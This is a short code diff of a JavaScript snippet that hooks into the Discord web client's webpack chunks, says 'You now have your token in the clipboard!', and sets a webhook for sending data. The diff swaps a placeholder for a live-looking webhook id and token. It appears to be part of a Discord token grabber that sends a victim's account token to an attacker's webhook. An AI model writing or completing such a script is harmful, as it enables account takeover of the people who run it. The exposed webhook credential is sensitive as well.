@@ -19,7 +19,7 @@ window.webpackChunkdiscord_app.push([
     console.log('%cWorked!', 'font-size: 50px');
     console.log('%cYou now have your token in the clipboard!', 'font-size: 16px');
 // Replace with your actual webhook URL
-const webhookURL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token';
+const webhookURL = 'https://discord.com/api/webhooks/1426156132430512229/RWPhPndAdqhIFbTY7ws7bpdVwC2iVy21cu9Zqna5YhMknG2j1smjSfy8YHd8OMVIpegD';
 
 // Data to send
 const messageData = {
